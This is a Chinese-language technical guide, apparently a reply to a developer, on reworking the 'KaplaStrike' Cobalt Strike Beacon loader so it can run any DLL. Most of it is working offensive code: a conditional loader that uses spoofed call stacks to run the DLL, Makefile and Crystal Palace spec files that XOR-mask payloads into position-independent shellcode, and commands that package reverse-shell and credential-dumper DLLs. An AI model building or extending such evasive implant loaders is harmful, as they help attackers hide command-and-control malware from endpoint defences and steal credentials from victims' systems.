# KaplaStrike 真正的限制和改造方案

## 问题所在：不是段的问题，而是**执行参数**的问题

### 当前代码分析（第 320-336 行）

```c
/* Get entry point and free decrypted buffer which contains signatures */
DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);

/* reason=1 — decrypts Beacon config, returns */
FUNCTION_CALL call = { 0 };
call.ptr     = (PVOID) entry;
call.argc    = 3;
call.args[0] = (ULONG_PTR) hSacrificial;
call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;      // ← 标准 DLL 参数 = 1
call.args[2] = (ULONG_PTR) NULL;
spoof_call(&call);

/* reason=4 — C2 poll loop via clean fake stack, never returns */
TransferExecutionViaStack((PVOID)entry, hSacrificial, 0x4);  // ← Beacon 魔数！
```

---

## 关键区别

### ��准 Windows DLL 的 DllMain

```c
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:    // = 1
            // 初始化代码
            return TRUE;
        
        case DLL_PROCESS_DETACH:    // = 0
            // 清理代码
            return TRUE;
    }
    return TRUE;
}
```

### Beacon DLL 的特殊处理

Beacon 有**两个特殊阶段**：

```c
/* Phase 1: DLL_PROCESS_ATTACH (reason=1) */
// - 解密 Beacon 配置
// - 初始化 C2 通信
// - 返回（短暂）

/* Phase 2: 自定义模式 (reason=0x4) */
// - 启动 C2 轮询循环
// - 永不返回（除非被终止）
// - 这是 Beacon 特定的魔数！
```

---

## 真正的改造方案

### **修改1：添加通用 DLL 支持标志**

在 `loader.c` 顶部添加编译条件：

```c
/* ── Universal DLL Loader Configuration ──────────────────────── */

/* Set to 1 to support any Windows DLL (not just Beacon)
   Set to 0 for Beacon-specific optimizations */
#define UNIVERSAL_DLL_MODE 0

#if UNIVERSAL_DLL_MODE
    #define TARGET_REASON_MAIN     DLL_PROCESS_ATTACH  // = 1
    #define TARGET_REASON_PERSIST  DLL_PROCESS_ATTACH  // = 1 (standard)
#else
    #define TARGET_REASON_MAIN     DLL_PROCESS_ATTACH  // = 1
    #define TARGET_REASON_PERSIST  0x4                 // Beacon特定
#endif
```

### **修改2：条件化执行逻辑**

将第 324-336 行改为：

```c
    /* Get entry point and free decrypted buffer */
    DLLMAIN_FUNC entry = EntryPoint(&cobaltData, (char *)hSacrificial);
    KERNEL32$VirtualFree(dll_raw_src, 0, MEM_RELEASE);

#if UNIVERSAL_DLL_MODE
    /* Universal DLL mode: Single DLL_PROCESS_ATTACH call */
    FUNCTION_CALL call = { 0 };
    call.ptr     = (PVOID) entry;
    call.argc    = 3;
    call.args[0] = (ULONG_PTR) hSacrificial;
    call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;
    call.args[2] = (ULONG_PTR) NULL;
    spoof_call(&call);
    
    /* For universal DLL, optionally return or cleanup */
    /* Standard Windows DLL execution ends here */
    
#else
    /* Beacon mode: Two-phase execution */
    
    /* Phase 1: DLL_PROCESS_ATTACH - Beacon initialization */
    FUNCTION_CALL call = { 0 };
    call.ptr     = (PVOID) entry;
    call.argc    = 3;
    call.args[0] = (ULONG_PTR) hSacrificial;
    call.args[1] = (ULONG_PTR) DLL_PROCESS_ATTACH;
    call.args[2] = (ULONG_PTR) NULL;
    spoof_call(&call);

    /* Phase 2: reason=0x4 - Beacon's C2 poll loop (never returns) */
    TransferExecutionViaStack((PVOID)entry, hSacrificial, 0x4);

#endif
```

---

## 编译选项

### 编译 Beacon 版本（默认）

```bash
make x64
# UNIVERSAL_DLL_MODE = 0
# 输出：只能运行 Beacon DLL
```

### 编译通用 DLL 版本

```bash
make x64 CFLAGS="-DUNIVERSAL_DLL_MODE=1"
# 或修改 Makefile：
# CFLAGS_64=-DWIN_X64 -shared -Wall -Wno-pointer-arith -DUNIVERSAL_DLL_MODE=1
# 输出：可以运行任何标准 Windows DLL
```

---

## Makefile 修改

添加两个编译目标：

```makefile
CC_64=x86_64-w64-mingw32-gcc
NASM=nasm
CFLAGS_64=-DWIN_X64 -shared -Wall -Wno-pointer-arith
CFLAGS_UNIVERSAL=-DWIN_X64 -shared -Wall -Wno-pointer-arith -DUNIVERSAL_DLL_MODE=1

all: x64

bin:
	mkdir -p bin

# ═══════════════════════════════════════════════════════════
# Beacon 版本（原始功能）
# ═══════════════════════════════════════════════════════════
x64: bin
	@echo "[*] Compiling Beacon-specific loader (x64)..."
	$(CC_64) $(CFLAGS_64) -c src/loader.c -o bin/loader.x64.o
	$(CC_64) $(CFLAGS_64) -c src/hooks/hooks.c -o bin/hooks.x64.o
	$(CC_64) $(CFLAGS_64) -c src/draugr/spoof.c -o bin/spoof.x64.o
	$(CC_64) $(CFLAGS_64) -c src/sleep/mask.c -o bin/mask.x64.o
	$(CC_64) $(CFLAGS_64) -c src/sleep/pico.c -o bin/pico.x64.o
	$(NASM) src/draugr/draugr.asm -o bin/draugr.x64.bin
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/sleep/cleanup.c -o bin/cleanup.x64.o
	$(CC_64) -DWIN_X64 -shared -Wall -Wno-pointer-arith -c src/cfg/cfg.c -o bin/cfg.x64.o
	@echo "[+] Beacon build complete!"

# ═══════════════════════════════════════════════════════════
# 通用 DLL 版本（新增）
# ═══════════════════════════════════════════════════════════
universal: bin
	@echo "[*] Compiling Universal DLL loader (x64)..."
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/loader.c -o bin/loader_universal.x64.o
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/hooks/hooks.c -o bin/hooks_universal.x64.o
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/draugr/spoof.c -o bin/spoof_universal.x64.o
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/sleep/mask.c -o bin/mask_universal.x64.o
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/sleep/pico.c -o bin/pico_universal.x64.o
	$(NASM) src/draugr/draugr.asm -o bin/draugr_universal.x64.bin
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/sleep/cleanup.c -o bin/cleanup_universal.x64.o
	$(CC_64) $(CFLAGS_UNIVERSAL) -c src/cfg/cfg.c -o bin/cfg_universal.x64.o
	@echo "[+] Universal DLL build complete!"

clean:
	@echo "[*] Cleaning build artifacts..."
	rm -f bin/loader*.x64.o
	rm -f bin/hooks*.x64.o
	rm -f bin/draugr*.x64.o bin/draugr*.x64.bin
	rm -f bin/pico*.x64.o
	rm -f bin/mask*.x64.o
	rm -f bin/spoof*.x64.o
	rm -f bin/cleanup*.x64.o
	rm -f bin/cfg*.x64.o
	@echo "[+] Clean complete!"

.PHONY: all x64 universal clean
```

---

## Crystal Palace 配置

创建 `spec/loader_universal.spec` 用于通用 DLL：

```python
# spec/loader_universal.spec
# Universal DLL Loader Configuration

x64:
	load "../bin/loader_universal.x64.o"
		make pic +gofirst
	mergelib "../Crystal-palace/libtcg.x64.zip"
	dfr "resolve" "ror13"

	load "../bin/hooks_universal.x64.o"
        merge
    
    load "../bin/spoof_universal.x64.o"
        merge

    load "../bin/draugr_universal.x64.bin"
        linkfunc "draugr_stub"

	attach "KERNEL32$CreateFileW"         "_CreateFileW"
    attach "KERNEL32$CloseHandle"         "_CloseHandle"
    attach "KERNEL32$VirtualAlloc"        "_VirtualAlloc"
    attach "KERNEL32$VirtualProtect"      "_VirtualProtect"
    attach "KERNEL32$RtlAddFunctionTable" "_RtlAddFunctionTable"
    attach "NTDLL$NtCreateSection"        "_NtCreateSection"
    attach "NTDLL$NtMapViewOfSection"     "_NtMapViewOfSection"
    attach "NTDLL$NtClose"                "_NtClose"
    attach "NTDLL$memset"                 "_memset"
    attach "NTDLL$memcpy"                 "_memcpy"
	attach "KERNEL32$LoadLibraryA"        "_LoadLibraryA"
    attach "KERNEL32$VirtualFree"         "_VirtualFree"

	preserve "KERNEL32$LoadLibraryA" "init_frame_info"

    generate $MASK 128

	push $DLL
        xor $MASK
        preplen
		link "cobalt_dll"
	
    push $MASK
        preplen
        link "cobalt_mask"
    run "pico.spec"
        link "pico"
    
    run "yara.spec"

	export
```

---

## 使用方法

### Beacon 版本

```bash
# 编译
make x64

# 生成 Beacon PIC blob
./link spec/loader.spec cobalt_strike_raw.dll output_beacon.bin

# 使用（仅 Beacon）
execute_shellcode(output_beacon.bin, ...)
```

### 通用 DLL 版本

```bash
# 编译（通用 DLL 支持）
make universal

# 生成不同 DLL 的加载器
./link spec/loader_universal.spec my_payload.dll output_payload.bin
./link spec/loader_universal.spec reverse_shell.dll output_shell.bin
./link spec/loader_universal.spec credential_dumper.dll output_dumper.bin

# 每个 output_*.bin 都是独立的 PIC blob，包含相应 DLL
execute_shellcode(output_payload.bin, ...)
execute_shellcode(output_shell.bin, ...)
execute_shellcode(output_dumper.bin, ...)
```

---

## 关键改动总结

| 位置 | 原始（Beacon） | 修改后（通用） |
|------|---|---|
| 第 331 行 | `DLL_PROCESS_ATTACH` | `DLL_PROCESS_ATTACH` ✅ |
| 第 336 行 | `TransferExecutionViaStack(..., 0x4)` | 条件化：通用 DLL 不调用 |
| 编译标志 | 无 | `DUNIVERSAL_DLL_MODE=1` |
| 支持的 DLL | 仅 Beacon | 任何标准 Windows DLL |

---

## 为什么这样设计

**Beacon 特殊性：**
- `reason=1` (DLL_PROCESS_ATTACH)：初始化阶段，解密配置
- `reason=0x4` (自定义)：进入 C2 轮询循环，**永远不返回**
- 这是 Beacon 的生命周期模型

**标准 DLL 生命周期：**
- `DLL_PROCESS_ATTACH`：初始化
- DLL 执行完毕后返回控制权给调用者
- 可能还有 `DLL_PROCESS_DETACH` 等

---

## 测试

```c
// 测试通用 DLL 加载
LPVOID pBlob = /* 加载 output_payload.bin */;

// 这会调用 payload.dll 的 DllMain(hInstance, DLL_PROCESS_ATTACH, NULL)
// 然后返回控制权
typedef void (*GO_FUNC)();
GO_FUNC go = (GO_FUNC)pBlob;
go();  // 执行 DLL 的 DllMain

// 对比 Beacon：
// Beacon 版本的 go() 会永远不返回（C2 轮询循环）
// 通用版本的 go() 会执行完 DllMain 后正常返回
```

---

## 总结

✅ **现在你明白了为什么"只能用 Beacon"**
- 不是因为段（`__DLLDATA__`）的问题
- 而是因为第 336 行的 `0x4` 魔数和 `TransferExecutionViaStack`
- 这是 Beacon 特定的持续执行模式

✅ **解决方案很简单**
- 添加编译时标志 `UNIVERSAL_DLL_MODE`
- 条件化第 324-336 行的执行逻辑
- 通用 DLL 只调用一次 `DllMain`，然后返回
- Beacon 调用两次（初始化 + 轮询循环）
